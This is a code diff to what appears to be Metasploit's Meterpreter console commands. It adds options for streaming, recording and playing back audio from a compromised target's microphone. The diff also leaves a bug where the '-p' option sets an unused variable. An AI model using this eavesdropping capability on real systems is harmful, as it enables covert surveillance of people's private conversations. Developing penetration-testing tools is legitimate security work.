@@ -22,12 +22,30 @@ module Rex
           # List of supported commands.
           #
           def commands
-            {
-                'mic_start'             => 'play an audio stream from the specified mic',
-                'mic_stop'              => 'stop capturing audio from device',
-                'mic_list' => 'list all audio interfaces',
-                'listen'                => 'listen to audio via audio player'
+            all = {
+              'mic_start' => 'start capturing an audio stream from the target mic',
+              'mic_stop'  => 'stop capturing audio',
+              'mic_list'  => 'list all microphone interfaces',
+              'listen'    => 'listen to streaming audio via audio player'
             }
+            reqs = {
+              'mic_start' => [ 'audio_mic_start' ],
+              'mic_stop'  => [ 'audio_mic_stop' ],
+              'mic_list'  => [ 'audio_mic_list' ],
+              'listen'    => [ 'audio_mic_start' ]
+            }
+
+            all.delete_if do |cmd, _desc|
+              del = false
+              reqs[cmd].each do |req|
+                next if client.commands.include? req
+                del = true
+                break
+              end
+              del
+            end
+
+            all
           end
 
           #
@@ -72,54 +90,86 @@ module Rex
             ]
           end
 
-          def cmd_mic_start(start_delay=4096)
-            print_status("Streaming mic audio channel...")
+          def cmd_mic_start(*args)
+            start_delay = 8
+            device_id = 1
+            duration = 1800
+            play_stream = true
+            saved_audio_path = Rex::Text.rand_text_alpha(8) + ".wav"
 
-            if client.mic.mic_list.length == 0
+            mic_start_opts = Rex::Parser::Arguments.new(
+              "-h" => [ false, "Help Banner" ],
+              "-d" => [ true, "The stream duration in seconds (Default: 1800)" ], # 30 min
+              "-m" => [ true, "Microphone device index to record from (1: system default)" ],
+              "-p" => [ true, "Automatically start a player for the stream (Default: '#{play_stream}')" ],
+              "-s" => [ true, "The saved audio file path (Default: '#{saved_audio_path}')" ]
+            )
+
+            mic_start_opts.parse(args) do |opt, _idx, val|
+              case opt
+                when "-h"
+                  print_line("Usage: mic_start [options]\n")
+                  print_line("Streams and records audio from the target microphone.")
+                  print_line(mic_start_opts.usage)
+                  return
+                when "-d"
+                  duration = val.to_i
+                when "-m"
+                  device_id = val.to_i
+                when "-p"
+                  play = false if val =~ /^(f|n|0)/i
+                when "-s"
+                  saved_audio_path = val
+              end
+            end
+
+            mic_list = client.mic.mic_list
+            if mic_list.length == 0
               print_error("Target does not have a mic")
               return
             end
+            if device_id < 1 || device_id > mic_list.length
+              print_error("Target does not have a mic with an id of #{device_id}")
+              return
+            end
 
-            print_status("Starting...")
-            stream_path = Rex::Text.rand_text_alpha(8) + ".wav"
-            duration = 1800
-            quality  = 50
-
-            print_status("Audio File: #{stream_path}")
-            print_status("Streaming...")
-
+            print_status("Saving to audio file: #{saved_audio_path}")
             begin
-              channel = client.mic.mic_start
+              channel = client.mic.mic_start(device_id)
               mic_started = true
+              print_status("Streaming started...")
               ::Timeout.timeout(duration) do
-                ::File.open(stream_path, 'wb') do |outfd|
+                ::File.open(saved_audio_path, 'wb') do |outfd|
                   audio_file_wave_header(11025, 1, 16, 2000000000).each { |e| e.write(outfd) }
                 end
                 stream_index = 0
                 while client do
-                  if stream_index == start_delay
-                    cmd_listen(stream_path)
-                  end
                   Rex::sleep(0.5)
-                  #data = client.mic.mic_get_frame(quality)
                   data = channel.read(65536)
                   if data
-                    ::File.open(stream_path, 'a') do |f|
+                    ::File.open(saved_audio_path, 'a') do |f|
                       f.write(data)
                     end
                     data = nil
+                    stream_index += 1
+                    if stream_index == start_delay
+                      cmd_listen(saved_audio_path)
+                    end
                   end
-                  stream_index += 1
                 end
               end
             rescue ::Timeout::Error
             ensure
-              client.mic.mic_stop if mic_started
+              if mic_started
+                client.mic.mic_stop
+                print_status("Streaming stopped.")
+              end
             end
           end
 
-          def cmd_listen(stream_path)
-            Rex::Compat.open_webrtc_browser("file://#{::File.absolute_path(stream_path)}")
+          def cmd_listen(saved_audio_path)
+            #Rex::Compat.open_webrtc_browser("file://#{::File.absolute_path(saved_audio_path)}")
+            Rex::Compat.play_sound(::File.expand_path(saved_audio_path))
           end
 
           def cmd_mic_stop
